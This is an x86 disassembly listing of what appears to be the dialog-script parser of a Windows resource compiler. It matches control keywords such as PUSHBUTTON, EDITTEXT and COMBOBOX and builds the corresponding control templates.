  405e0f:	81 7e 01 54 45 58 54 	cmpl   $0x54584554,0x1(%esi)
  405e16:	75 1d                	jne    0x405e35
  405e18:	b8 00 00 02 00       	mov    $0x20000,%eax
  405e1d:	80 3e 4c             	cmpb   $0x4c,(%esi)
  405e20:	74 0e                	je     0x405e30
  405e22:	b0 01                	mov    $0x1,%al
  405e24:	80 3e 43             	cmpb   $0x43,(%esi)
  405e27:	74 07                	je     0x405e30
  405e29:	b0 02                	mov    $0x2,%al
  405e2b:	80 3e 52             	cmpb   $0x52,(%esi)
  405e2e:	75 34                	jne    0x405e64
  405e30:	66 bb 82 00          	mov    $0x82,%bx
  405e34:	c3                   	ret
  405e35:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  405e3c:	74 26                	je     0x405e64
  405e3e:	81 7e 01 45 44 49 54 	cmpl   $0x54494445,0x1(%esi)
  405e45:	75 1d                	jne    0x405e64
  405e47:	80 3e 48             	cmpb   $0x48,(%esi)
  405e4a:	74 05                	je     0x405e51
  405e4c:	80 3e 49             	cmpb   $0x49,(%esi)
  405e4f:	75 13                	jne    0x405e64
  405e51:	80 0d c5 ab 40 00 04 	orb    $0x4,0x40abc5
  405e58:	31 c0                	xor    %eax,%eax
  405e5a:	b8 00 00 81 00       	mov    $0x810000,%eax
  405e5f:	66 bb fe 02          	mov    $0x2fe,%bx
  405e63:	c3                   	ret
  405e64:	f9                   	stc
  405e65:	c3                   	ret
  405e66:	80 fb 06             	cmp    $0x6,%bl
  405e69:	75 1a                	jne    0x405e85
  405e6b:	81 3e 53 54 41 54    	cmpl   $0x54415453,(%esi)
  405e71:	75 46                	jne    0x405eb9
  405e73:	66 81 7e 04 45 33    	cmpw   $0x3345,0x4(%esi)
  405e79:	75 3e                	jne    0x405eb9
  405e7b:	b8 05 00 01 00       	mov    $0x10005,%eax
  405e80:	66 bb 80 00          	mov    $0x80,%bx
  405e84:	c3                   	ret
  405e85:	80 fb 07             	cmp    $0x7,%bl
  405e88:	75 55                	jne    0x405edf
  405e8a:	81 3e 50 55 53 48    	cmpl   $0x48535550,(%esi)
  405e90:	75 13                	jne    0x405ea5
  405e92:	81 7e 03 48 42 4f 58 	cmpl   $0x584f4248,0x3(%esi)
  405e99:	75 1e                	jne    0x405eb9
  405e9b:	b8 0a 00 01 00       	mov    $0x1000a,%eax
  405ea0:	66 bb 80 00          	mov    $0x80,%bx
  405ea4:	c3                   	ret
  405ea5:	81 3e 43 4f 4e 54    	cmpl   $0x544e4f43,(%esi)
  405eab:	75 0e                	jne    0x405ebb
  405ead:	81 7e 03 54 52 4f 4c 	cmpl   $0x4c4f5254,0x3(%esi)
  405eb4:	75 03                	jne    0x405eb9
  405eb6:	09 f6                	or     %esi,%esi
  405eb8:	c3                   	ret
  405eb9:	f9                   	stc
  405eba:	c3                   	ret
  405ebb:	81 3e 4c 49 53 54    	cmpl   $0x5453494c,(%esi)
  405ec1:	75 44                	jne    0x405f07
  405ec3:	81 7e 03 54 42 4f 58 	cmpl   $0x584f4254,0x3(%esi)
  405eca:	75 3b                	jne    0x405f07
  405ecc:	80 0d c5 ab 40 00 04 	orb    $0x4,0x40abc5
  405ed3:	31 c0                	xor    %eax,%eax
  405ed5:	b8 01 00 80 00       	mov    $0x800001,%eax
  405eda:	66 bb 83 00          	mov    $0x83,%bx
  405ede:	c3                   	ret
  405edf:	80 fb 08             	cmp    $0x8,%bl
  405ee2:	0f 85 7d 00 00 00    	jne    0x405f65
  405ee8:	81 3e 43 4f 4d 42    	cmpl   $0x424d4f43,(%esi)
  405eee:	75 19                	jne    0x405f09
  405ef0:	81 7e 04 4f 42 4f 58 	cmpl   $0x584f424f,0x4(%esi)
  405ef7:	75 0e                	jne    0x405f07
  405ef9:	80 0d c5 ab 40 00 04 	orb    $0x4,0x40abc5
  405f00:	31 c0                	xor    %eax,%eax
  405f02:	66 bb 85 00          	mov    $0x85,%bx
  405f06:	c3                   	ret
  405f07:	f9                   	stc
  405f08:	c3                   	ret
  405f09:	81 3e 43 48 45 43    	cmpl   $0x43454843,(%esi)
  405f0f:	75 13                	jne    0x405f24
  405f11:	81 7e 04 4b 42 4f 58 	cmpl   $0x584f424b,0x4(%esi)
  405f18:	75 2e                	jne    0x405f48
  405f1a:	b8 02 00 01 00       	mov    $0x10002,%eax
  405f1f:	66 bb 80 00          	mov    $0x80,%bx
  405f23:	c3                   	ret
  405f24:	81 3e 45 44 49 54    	cmpl   $0x54494445,(%esi)
  405f2a:	75 1e                	jne    0x405f4a
  405f2c:	81 7e 04 54 45 58 54 	cmpl   $0x54584554,0x4(%esi)
  405f33:	75 13                	jne    0x405f48
  405f35:	80 0d c5 ab 40 00 04 	orb    $0x4,0x40abc5
  405f3c:	31 c0                	xor    %eax,%eax
  405f3e:	b8 00 00 81 00       	mov    $0x810000,%eax
  405f43:	66 bb 81 00          	mov    $0x81,%bx
  405f47:	c3                   	ret
  405f48:	f9                   	stc
  405f49:	c3                   	ret
  405f4a:	81 3e 47 52 4f 55    	cmpl   $0x554f5247,(%esi)
  405f50:	75 3d                	jne    0x405f8f
  405f52:	81 7e 04 50 42 4f 58 	cmpl   $0x584f4250,0x4(%esi)
  405f59:	75 34                	jne    0x405f8f
  405f5b:	b8 07 00 00 00       	mov    $0x7,%eax
  405f60:	66 bb 80 00          	mov    $0x80,%bx
  405f64:	c3                   	ret
  405f65:	80 fb 09             	cmp    $0x9,%bl
  405f68:	75 27                	jne    0x405f91
  405f6a:	81 3e 53 43 52 4f    	cmpl   $0x4f524353,(%esi)
  405f70:	75 1d                	jne    0x405f8f
  405f72:	81 7e 04 4c 4c 42 41 	cmpl   $0x41424c4c,0x4(%esi)
  405f79:	75 14                	jne    0x405f8f
  405f7b:	80 7e 08 52          	cmpb   $0x52,0x8(%esi)
  405f7f:	75 0e                	jne    0x405f8f
  405f81:	80 0d c5 ab 40 00 04 	orb    $0x4,0x40abc5
  405f88:	31 c0                	xor    %eax,%eax
  405f8a:	66 bb 84 00          	mov    $0x84,%bx
  405f8e:	c3                   	ret
  405f8f:	f9                   	stc
  405f90:	c3                   	ret
  405f91:	80 fb 0a             	cmp    $0xa,%bl
  405f94:	75 46                	jne    0x405fdc
  405f96:	81 3e 41 55 54 4f    	cmpl   $0x4f545541,(%esi)
  405f9c:	75 1b                	jne    0x405fb9
  405f9e:	81 7e 04 33 53 54 41 	cmpl   $0x41545333,0x4(%esi)
  405fa5:	75 5e                	jne    0x406005
  405fa7:	66 81 7e 08 54 45    	cmpw   $0x4554,0x8(%esi)
  405fad:	75 56                	jne    0x406005
  405faf:	b8 06 00 01 00       	mov    $0x10006,%eax
  405fb4:	66 bb 80 00          	mov    $0x80,%bx
  405fb8:	c3                   	ret
  405fb9:	81 3e 50 55 53 48    	cmpl   $0x48535550,(%esi)
  405fbf:	75 44                	jne    0x406005
  405fc1:	81 7e 04 42 55 54 54 	cmpl   $0x54545542,0x4(%esi)
  405fc8:	75 3b                	jne    0x406005
  405fca:	66 81 7e 08 4f 4e    	cmpw   $0x4e4f,0x8(%esi)
  405fd0:	75 33                	jne    0x406005
  405fd2:	b8 00 00 01 00       	mov    $0x10000,%eax
  405fd7:	66 bb 80 00          	mov    $0x80,%bx
  405fdb:	c3                   	ret
  405fdc:	80 fb 0b             	cmp    $0xb,%bl
  405fdf:	75 26                	jne    0x406007
  405fe1:	81 3e 52 41 44 49    	cmpl   $0x49444152,(%esi)
  405fe7:	75 1c                	jne    0x406005
  405fe9:	81 7e 04 4f 42 55 54 	cmpl   $0x5455424f,0x4(%esi)
  405ff0:	75 13                	jne    0x406005
  405ff2:	81 7e 07 54 54 4f 4e 	cmpl   $0x4e4f5454,0x7(%esi)
  405ff9:	75 0a                	jne    0x406005
  405ffb:	b8 04 00 00 00       	mov    $0x4,%eax
  406000:	66 bb 80 00          	mov    $0x80,%bx
  406004:	c3                   	ret
  406005:	f9                   	stc
  406006:	c3                   	ret
  406007:	80 fb 0c             	cmp    $0xc,%bl
  40600a:	75 24                	jne    0x406030
  40600c:	81 3e 41 55 54 4f    	cmpl   $0x4f545541,(%esi)
  406012:	75 4b                	jne    0x40605f
  406014:	81 7e 04 43 48 45 43 	cmpl   $0x43454843,0x4(%esi)
  40601b:	75 42                	jne    0x40605f
  40601d:	81 7e 08 4b 42 4f 58 	cmpl   $0x584f424b,0x8(%esi)
  406024:	75 39                	jne    0x40605f
  406026:	b8 03 00 01 00       	mov    $0x10003,%eax
  40602b:	66 bb 80 00          	mov    $0x80,%bx
  40602f:	c3                   	ret
  406030:	80 fb 0d             	cmp    $0xd,%bl
  406033:	75 2c                	jne    0x406061
  406035:	81 3e 44 45 46 50    	cmpl   $0x50464544,(%esi)
  40603b:	75 22                	jne    0x40605f
  40603d:	81 7e 04 55 53 48 42 	cmpl   $0x42485355,0x4(%esi)
  406044:	75 19                	jne    0x40605f
  406046:	81 7e 08 55 54 54 4f 	cmpl   $0x4f545455,0x8(%esi)
  40604d:	75 10                	jne    0x40605f
  40604f:	80 7e 0c 4e          	cmpb   $0x4e,0xc(%esi)
  406053:	75 0a                	jne    0x40605f
  406055:	b8 01 00 01 00       	mov    $0x10001,%eax
  40605a:	66 bb 80 00          	mov    $0x80,%bx
  40605e:	c3                   	ret
  40605f:	f9                   	stc
  406060:	c3                   	ret
  406061:	80 fb 0f             	cmp    $0xf,%bl
  406064:	75 2d                	jne    0x406093
  406066:	81 3e 41 55 54 4f    	cmpl   $0x4f545541,(%esi)
  40606c:	75 25                	jne    0x406093
  40606e:	81 7e 04 52 41 44 49 	cmpl   $0x49444152,0x4(%esi)
  406075:	75 1c                	jne    0x406093
  406077:	81 7e 08 4f 42 55 54 	cmpl   $0x5455424f,0x8(%esi)
  40607e:	75 13                	jne    0x406093
  406080:	81 7e 0b 54 54 4f 4e 	cmpl   $0x4e4f5454,0xb(%esi)
  406087:	75 0a                	jne    0x406093
  406089:	b8 09 00 00 00       	mov    $0x9,%eax
  40608e:	66 bb 80 00          	mov    $0x80,%bx
  406092:	c3                   	ret
  406093:	f9                   	stc
  406094:	c3                   	ret
  406095:	e8 6f e3 ff ff       	call   0x404409
  40609a:	72 5e                	jb     0x4060fa
  40609c:	e8 62 e2 ff ff       	call   0x404303
  4060a1:	72 3c                	jb     0x4060df
  4060a3:	75 62                	jne    0x406107
  4060a5:	53                   	push   %ebx
  4060a6:	56                   	push   %esi
  4060a7:	e8 13 cc ff ff       	call   0x402cbf
  4060ac:	be ec ab 40 00       	mov    $0x40abec,%esi
  4060b1:	80 7e 02 5f          	cmpb   $0x5f,0x2(%esi)
  4060b5:	75 31                	jne    0x4060e8
  4060b7:	66 81 3e 46 57       	cmpw   $0x5746,(%esi)
  4060bc:	75 2a                	jne    0x4060e8
  4060be:	83 c6 03             	add    $0x3,%esi
  4060c1:	83 eb 03             	sub    $0x3,%ebx
  4060c4:	76 22                	jbe    0x4060e8
  4060c6:	b8 cc d8 40 00       	mov    $0x40d8cc,%eax
  4060cb:	e8 ae 20 00 00       	call   0x40817e
  4060d0:	72 16                	jb     0x4060e8
  4060d2:	b2 64                	mov    $0x64,%dl
  4060d4:	f6 e2                	mul    %dl
  4060d6:	25 ff ff 00 00       	and    $0xffff,%eax
  4060db:	5e                   	pop    %esi
  4060dc:	5b                   	pop    %ebx
  4060dd:	eb 36                	jmp    0x406115
  4060df:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  4060e6:	eb 33                	jmp    0x40611b
  4060e8:	5e                   	pop    %esi
  4060e9:	5b                   	pop    %ebx
  4060ea:	e8 19 da ff ff       	call   0x403b08
  4060ef:	73 0b                	jae    0x4060fc
  4060f1:	09 d2                	or     %edx,%edx
  4060f3:	75 05                	jne    0x4060fa
  4060f5:	ba 5a 08 00 04       	mov    $0x400085a,%edx
  4060fa:	f9                   	stc
  4060fb:	c3                   	ret
  4060fc:	e8 8d da ff ff       	call   0x403b8e
  406101:	72 92                	jb     0x406095
  406103:	74 09                	je     0x40610e
  406105:	eb ee                	jmp    0x4060f5
  406107:	e8 c0 da ff ff       	call   0x403bcc
  40610c:	72 e7                	jb     0x4060f5
  40610e:	e8 8c db ff ff       	call   0x403c9f
  406113:	72 e5                	jb     0x4060fa
  406115:	66 a3 dc f2 40 00    	mov    %ax,0x40f2dc
  40611b:	f8                   	clc
  40611c:	c3                   	ret
  40611d:	e8 e7 e2 ff ff       	call   0x404409
  406122:	72 5e                	jb     0x406182
  406124:	e8 da e1 ff ff       	call   0x404303
  406129:	72 3c                	jb     0x406167
  40612b:	75 62                	jne    0x40618f
  40612d:	53                   	push   %ebx
  40612e:	56                   	push   %esi
  40612f:	83 fb 09             	cmp    $0x9,%ebx
  406132:	72 3c                	jb     0x406170
  406134:	e8 86 cb ff ff       	call   0x402cbf
  406139:	be ec ab 40 00       	mov    $0x40abec,%esi
  40613e:	81 7c 1e f8 5f 43 48 	cmpl   $0x4148435f,-0x8(%esi,%ebx,1)
  406145:	41 
  406146:	75 28                	jne    0x406170
  406148:	81 7c 1e fc 52 53 45 	cmpl   $0x54455352,-0x4(%esi,%ebx,1)
  40614f:	54 
  406150:	75 1e                	jne    0x406170
  406152:	83 eb 08             	sub    $0x8,%ebx
  406155:	76 19                	jbe    0x406170
  406157:	b8 8c d9 40 00       	mov    $0x40d98c,%eax
  40615c:	e8 1d 20 00 00       	call   0x40817e
  406161:	72 0d                	jb     0x406170
  406163:	5e                   	pop    %esi
  406164:	5b                   	pop    %ebx
  406165:	eb 36                	jmp    0x40619d
  406167:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  40616e:	eb 32                	jmp    0x4061a2
  406170:	5e                   	pop    %esi
  406171:	5b                   	pop    %ebx
  406172:	e8 91 d9 ff ff       	call   0x403b08
  406177:	73 0b                	jae    0x406184
  406179:	09 d2                	or     %edx,%edx
  40617b:	75 05                	jne    0x406182
  40617d:	ba 94 08 00 04       	mov    $0x4000894,%edx
  406182:	f9                   	stc
  406183:	c3                   	ret
  406184:	e8 05 da ff ff       	call   0x403b8e
  406189:	72 92                	jb     0x40611d
  40618b:	74 09                	je     0x406196
  40618d:	eb ee                	jmp    0x40617d
  40618f:	e8 38 da ff ff       	call   0x403bcc
  406194:	72 e7                	jb     0x40617d
  406196:	e8 3c db ff ff       	call   0x403cd7
  40619b:	72 e5                	jb     0x406182
  40619d:	a2 df f2 40 00       	mov    %al,0x40f2df
  4061a2:	f8                   	clc
  4061a3:	c3                   	ret
  4061a4:	f9                   	stc
  4061a5:	c3                   	ret
  4061a6:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  4061ab:	80 0a 01             	orb    $0x1,(%edx)
  4061ae:	83 c2 1a             	add    $0x1a,%edx
  4061b1:	e8 82 f2 ff ff       	call   0x405438
  4061b6:	72 ec                	jb     0x4061a4
  4061b8:	ba 59 08 00 04       	mov    $0x4000859,%edx
  4061bd:	74 e5                	je     0x4061a4
  4061bf:	e8 9d e3 ff ff       	call   0x404561
  4061c4:	72 de                	jb     0x4061a4
  4061c6:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  4061cb:	81 c2 40 04 00 00    	add    $0x440,%edx
  4061d1:	80 0d c5 ab 40 00 02 	orb    $0x2,0x40abc5
  4061d8:	c7 05 cc aa 40 00 67 	movl   $0x867,0x40aacc
  4061df:	08 00 00 
  4061e2:	e8 96 f1 ff ff       	call   0x40537d
  4061e7:	72 bb                	jb     0x4061a4
  4061e9:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  4061f0:	0f 84 6c 00 00 00    	je     0x406262
  4061f6:	66 c7 05 dc f2 40 00 	movw   $0x0,0x40f2dc
  4061fd:	00 00 
  4061ff:	66 c7 05 de f2 40 00 	movw   $0x0,0x40f2de
  406206:	00 00 
  406208:	e8 54 e3 ff ff       	call   0x404561
  40620d:	72 38                	jb     0x406247
  40620f:	e8 81 fe ff ff       	call   0x406095
  406214:	72 2f                	jb     0x406245
  406216:	e8 46 e3 ff ff       	call   0x404561
  40621b:	72 2a                	jb     0x406247
  40621d:	e8 e7 e1 ff ff       	call   0x404409
  406222:	72 21                	jb     0x406245
  406224:	e8 da e0 ff ff       	call   0x404303
  406229:	72 1c                	jb     0x406247
  40622b:	74 1d                	je     0x40624a
  40622d:	e8 9a d9 ff ff       	call   0x403bcc
  406232:	ba 5b 08 00 04       	mov    $0x400085b,%edx
  406237:	72 0c                	jb     0x406245
  406239:	e8 40 da ff ff       	call   0x403c7e
  40623e:	83 f8 01             	cmp    $0x1,%eax
  406241:	74 2e                	je     0x406271
  406243:	72 1d                	jb     0x406262
  406245:	f9                   	stc
  406246:	c3                   	ret
  406247:	09 c9                	or     %ecx,%ecx
  406249:	c3                   	ret
  40624a:	ba 5b 08 00 04       	mov    $0x400085b,%edx
  40624f:	83 fb 05             	cmp    $0x5,%ebx
  406252:	75 10                	jne    0x406264
  406254:	81 3e 46 41 4c 53    	cmpl   $0x534c4146,(%esi)
  40625a:	75 e9                	jne    0x406245
  40625c:	80 7e 04 45          	cmpb   $0x45,0x4(%esi)
  406260:	75 e3                	jne    0x406245
  406262:	eb 14                	jmp    0x406278
  406264:	83 fb 04             	cmp    $0x4,%ebx
  406267:	75 08                	jne    0x406271
  406269:	81 3e 54 52 55 45    	cmpl   $0x45555254,(%esi)
  40626f:	75 d4                	jne    0x406245
  406271:	c6 05 de f2 40 00 01 	movb   $0x1,0x40f2de
  406278:	e8 e4 e2 ff ff       	call   0x404561
  40627d:	72 c8                	jb     0x406247
  40627f:	e8 99 fe ff ff       	call   0x40611d
  406284:	72 02                	jb     0x406288
  406286:	31 d2                	xor    %edx,%edx
  406288:	c3                   	ret
  406289:	66 83 3e ff          	cmpw   $0xffff,(%esi)
  40628d:	75 02                	jne    0x406291
  40628f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406290:	c3                   	ret
  406291:	66 ad                	lods   %ds:(%esi),%ax
  406293:	66 ab                	stos   %ax,%es:(%edi)
  406295:	66 83 f8 00          	cmp    $0x0,%ax
  406299:	75 f6                	jne    0x406291
  40629b:	c3                   	ret
  40629c:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  4062a1:	2b 05 d8 aa 40 00    	sub    0x40aad8,%eax
  4062a7:	8b 15 7c aa 40 00    	mov    0x40aa7c,%edx
  4062ad:	89 02                	mov    %eax,(%edx)
  4062af:	c3                   	ret
  4062b0:	51                   	push   %ecx
  4062b1:	57                   	push   %edi
  4062b2:	be c0 f2 40 00       	mov    $0x40f2c0,%esi
  4062b7:	31 c0                	xor    %eax,%eax
  4062b9:	f6 06 04             	testb  $0x4,(%esi)
  4062bc:	75 05                	jne    0x4062c3
  4062be:	b8 00 00 88 80       	mov    $0x80880000,%eax
  4062c3:	f6 06 02             	testb  $0x2,(%esi)
  4062c6:	74 05                	je     0x4062cd
  4062c8:	0d 00 00 c0 00       	or     $0xc00000,%eax
  4062cd:	f6 06 01             	testb  $0x1,(%esi)
  4062d0:	74 03                	je     0x4062d5
  4062d2:	83 c8 40             	or     $0x40,%eax
  4062d5:	8b 56 0c             	mov    0xc(%esi),%edx
  4062d8:	09 c2                	or     %eax,%edx
  4062da:	8b 3d 78 aa 40 00    	mov    0x40aa78,%edi
  4062e0:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  4062e7:	74 1f                	je     0x406308
  4062e9:	66 c7 07 01 00       	movw   $0x1,(%edi)
  4062ee:	66 c7 47 02 ff ff    	movw   $0xffff,0x2(%edi)
  4062f4:	8b 46 04             	mov    0x4(%esi),%eax
  4062f7:	89 47 04             	mov    %eax,0x4(%edi)
  4062fa:	8b 46 08             	mov    0x8(%esi),%eax
  4062fd:	89 47 08             	mov    %eax,0x8(%edi)
  406300:	89 57 0c             	mov    %edx,0xc(%edi)
  406303:	83 c7 12             	add    $0x12,%edi
  406306:	eb 0b                	jmp    0x406313
  406308:	89 17                	mov    %edx,(%edi)
  40630a:	8b 46 08             	mov    0x8(%esi),%eax
  40630d:	89 47 04             	mov    %eax,0x4(%edi)
  406310:	83 c7 0a             	add    $0xa,%edi
  406313:	89 f8                	mov    %edi,%eax
  406315:	83 e8 02             	sub    $0x2,%eax
  406318:	a3 ec aa 40 00       	mov    %eax,0x40aaec
  40631d:	83 c6 12             	add    $0x12,%esi
  406320:	b9 04 00 00 00       	mov    $0x4,%ecx
  406325:	f3 66 a5             	rep movsw %ds:(%esi),%es:(%edi)
  406328:	be c0 f2 40 00       	mov    $0x40f2c0,%esi
  40632d:	83 c6 40             	add    $0x40,%esi
  406330:	e8 54 ff ff ff       	call   0x406289
  406335:	be c0 f2 40 00       	mov    $0x40f2c0,%esi
  40633a:	81 c6 40 01 00 00    	add    $0x140,%esi
  406340:	e8 44 ff ff ff       	call   0x406289
  406345:	be c0 f2 40 00       	mov    $0x40f2c0,%esi
  40634a:	81 c6 40 02 00 00    	add    $0x240,%esi
  406350:	e8 3c ff ff ff       	call   0x406291
  406355:	be c0 f2 40 00       	mov    $0x40f2c0,%esi
  40635a:	f6 06 01             	testb  $0x1,(%esi)
  40635d:	75 15                	jne    0x406374
  40635f:	f7 46 0c 40 00 00 00 	testl  $0x40,0xc(%esi)
  406366:	74 38                	je     0x4063a0
  406368:	ba 5e 14 00 00       	mov    $0x145e,%edx
  40636d:	e8 82 db ff ff       	call   0x403ef4
  406372:	eb 2c                	jmp    0x4063a0
  406374:	8b 15 d8 aa 40 00    	mov    0x40aad8,%edx
  40637a:	66 8b 46 1a          	mov    0x1a(%esi),%ax
  40637e:	66 ab                	stos   %ax,%es:(%edi)
  406380:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  406387:	74 0c                	je     0x406395
  406389:	66 8b 46 1c          	mov    0x1c(%esi),%ax
  40638d:	66 ab                	stos   %ax,%es:(%edi)
  40638f:	66 8b 46 1e          	mov    0x1e(%esi),%ax
  406393:	66 ab                	stos   %ax,%es:(%edi)
  406395:	81 c6 40 04 00 00    	add    $0x440,%esi
  40639b:	e8 f1 fe ff ff       	call   0x406291
  4063a0:	89 3d 78 aa 40 00    	mov    %edi,0x40aa78
  4063a6:	f8                   	clc
  4063a7:	5f                   	pop    %edi
  4063a8:	59                   	pop    %ecx
  4063a9:	c3                   	ret
  4063aa:	66 c7 05 76 ab 40 00 	movw   $0x0,0x40ab76
  4063b1:	00 00 
  4063b3:	51                   	push   %ecx
  4063b4:	57                   	push   %edi
  4063b5:	b9 00 02 00 00       	mov    $0x200,%ecx
  4063ba:	31 c0                	xor    %eax,%eax
  4063bc:	bf c0 f2 40 00       	mov    $0x40f2c0,%edi
  4063c1:	f3 ab                	rep stos %eax,%es:(%edi)
  4063c3:	5f                   	pop    %edi
  4063c4:	59                   	pop    %ecx
  4063c5:	c3                   	ret
  4063c6:	3c 07                	cmp    $0x7,%al
  4063c8:	75 1e                	jne    0x4063e8
  4063ca:	ba 55 08 00 04       	mov    $0x4000855,%edx
  4063cf:	e8 23 e2 ff ff       	call   0x4045f7
  4063d4:	72 11                	jb     0x4063e7
  4063d6:	80 0d c6 ab 40 00 40 	orb    $0x40,0x40abc6
  4063dd:	a3 70 ab 40 00       	mov    %eax,0x40ab70
  4063e2:	e8 a6 f4 ff ff       	call   0x40588d
  4063e7:	c3                   	ret
  4063e8:	3c 08                	cmp    $0x8,%al
  4063ea:	75 1a                	jne    0x406406
  4063ec:	e8 b9 ea ff ff       	call   0x404eaa
  4063f1:	72 12                	jb     0x406405
  4063f3:	80 0d c6 ab 40 00 80 	orb    $0x80,0x40abc6
  4063fa:	66 a3 7c ab 40 00    	mov    %ax,0x40ab7c
  406400:	e8 88 f4 ff ff       	call   0x40588d
  406405:	c3                   	ret
  406406:	3c 0f                	cmp    $0xf,%al
  406408:	75 17                	jne    0x406421
  40640a:	ba 51 08 00 04       	mov    $0x4000851,%edx
  40640f:	e8 e3 e1 ff ff       	call   0x4045f7
  406414:	72 0a                	jb     0x406420
  406416:	a3 68 ab 40 00       	mov    %eax,0x40ab68
  40641b:	e8 6d f4 ff ff       	call   0x40588d
  406420:	c3                   	ret
  406421:	3c 01                	cmp    $0x1,%al
  406423:	75 2e                	jne    0x406453
  406425:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  40642a:	81 c2 40 02 00 00    	add    $0x240,%edx
  406430:	c7 05 cc aa 40 00 68 	movl   $0x868,0x40aacc
  406437:	08 00 00 
  40643a:	e8 3e ef ff ff       	call   0x40537d
  40643f:	72 11                	jb     0x406452
  406441:	09 db                	or     %ebx,%ebx
  406443:	74 08                	je     0x40644d
  406445:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  40644a:	80 0a 02             	orb    $0x2,(%edx)
  40644d:	e8 3b f4 ff ff       	call   0x40588d
  406452:	c3                   	ret
  406453:	3c 02                	cmp    $0x2,%al
  406455:	75 15                	jne    0x40646c
  406457:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  40645c:	83 c2 08             	add    $0x8,%edx
  40645f:	80 0d c5 ab 40 00 10 	orb    $0x10,0x40abc5
  406466:	e8 c3 f2 ff ff       	call   0x40572e
  40646b:	c3                   	ret
  40646c:	3c 03                	cmp    $0x3,%al
  40646e:	75 1f                	jne    0x40648f
  406470:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  406475:	83 c2 40             	add    $0x40,%edx
  406478:	c7 05 cc aa 40 00 58 	movl   $0x4000858,0x40aacc
  40647f:	08 00 04 
  406482:	e8 52 ef ff ff       	call   0x4053d9
  406487:	72 05                	jb     0x40648e
  406489:	e8 ff f3 ff ff       	call   0x40588d
  40648e:	c3                   	ret
  40648f:	3c 04                	cmp    $0x4,%al
  406491:	75 0f                	jne    0x4064a2
  406493:	e8 0e fd ff ff       	call   0x4061a6
  406498:	72 07                	jb     0x4064a1
  40649a:	75 05                	jne    0x4064a1
  40649c:	e8 ec f3 ff ff       	call   0x40588d
  4064a1:	c3                   	ret
  4064a2:	3c 05                	cmp    $0x5,%al
  4064a4:	75 1f                	jne    0x4064c5
  4064a6:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  4064ab:	81 c2 40 01 00 00    	add    $0x140,%edx
  4064b1:	80 0d c5 ab 40 00 80 	orb    $0x80,0x40abc5
  4064b8:	e8 76 f4 ff ff       	call   0x405933
  4064bd:	72 05                	jb     0x4064c4
  4064bf:	e8 c9 f3 ff ff       	call   0x40588d
  4064c4:	c3                   	ret
  4064c5:	3c 06                	cmp    $0x6,%al
  4064c7:	75 19                	jne    0x4064e2
  4064c9:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  4064ce:	83 c2 0c             	add    $0xc,%edx
  4064d1:	e8 58 f2 ff ff       	call   0x40572e
  4064d6:	72 09                	jb     0x4064e1
  4064d8:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  4064dd:	80 0a 04             	orb    $0x4,(%edx)
  4064e0:	f8                   	clc
  4064e1:	c3                   	ret
  4064e2:	ba 8b 18 01 00       	mov    $0x1188b,%edx
  4064e7:	f9                   	stc
  4064e8:	c3                   	ret
  4064e9:	52                   	push   %edx
  4064ea:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  4064f0:	c1 ea 04             	shr    $0x4,%edx
  4064f3:	42                   	inc    %edx
  4064f4:	89 15 50 ab 40 00    	mov    %edx,0x40ab50
  4064fa:	80 0d c6 ab 40 00 c0 	orb    $0xc0,0x40abc6
  406501:	66 8b 46 0e          	mov    0xe(%esi),%ax
  406505:	66 a3 74 ab 40 00    	mov    %ax,0x40ab74
  40650b:	8b 46 04             	mov    0x4(%esi),%eax
  40650e:	a3 70 ab 40 00       	mov    %eax,0x40ab70
  406513:	8b 46 08             	mov    0x8(%esi),%eax
  406516:	a3 68 ab 40 00       	mov    %eax,0x40ab68
  40651b:	66 8b 46 0c          	mov    0xc(%esi),%ax
  40651f:	66 a3 7c ab 40 00    	mov    %ax,0x40ab7c
  406525:	ba 00 02 00 00       	mov    $0x200,%edx
  40652a:	e8 b1 e8 ff ff       	call   0x404de0
  40652f:	72 2a                	jb     0x40655b
  406531:	8b 3d 78 aa 40 00    	mov    0x40aa78,%edi
  406537:	c7 05 5c ab 40 00 00 	movl   $0x0,0x40ab5c
  40653e:	00 00 00 
  406541:	c7 05 60 ab 40 00 00 	movl   $0x0,0x40ab60
  406548:	00 00 00 
  40654b:	e8 af 03 00 00       	call   0x4068ff
  406550:	89 3d 78 aa 40 00    	mov    %edi,0x40aa78
  406556:	89 d7                	mov    %edx,%edi
  406558:	f8                   	clc
  406559:	5a                   	pop    %edx
  40655a:	c3                   	ret
  40655b:	f9                   	stc
  40655c:	5a                   	pop    %edx
  40655d:	c3                   	ret
  40655e:	53                   	push   %ebx
  40655f:	57                   	push   %edi
  406560:	52                   	push   %edx
  406561:	56                   	push   %esi
  406562:	31 db                	xor    %ebx,%ebx
  406564:	66 8b 5e 06          	mov    0x6(%esi),%bx
  406568:	89 da                	mov    %ebx,%edx
  40656a:	d1 e2                	shl    $1,%edx
  40656c:	e8 6f e8 ff ff       	call   0x404de0
  406571:	72 1f                	jb     0x406592
  406573:	8b 76 08             	mov    0x8(%esi),%esi
  406576:	8b 3d 78 aa 40 00    	mov    0x40aa78,%edi
  40657c:	83 c7 02             	add    $0x2,%edi
  40657f:	e8 04 ec ff ff       	call   0x405188
  406584:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  406589:	29 f8                	sub    %edi,%eax
  40658b:	d1 e8                	shr    $1,%eax
  40658d:	66 89 47 fe          	mov    %ax,-0x2(%edi)
  406591:	f8                   	clc
  406592:	5e                   	pop    %esi
  406593:	5a                   	pop    %edx
  406594:	5f                   	pop    %edi
  406595:	5b                   	pop    %ebx
  406596:	c3                   	ret
  406597:	55                   	push   %ebp
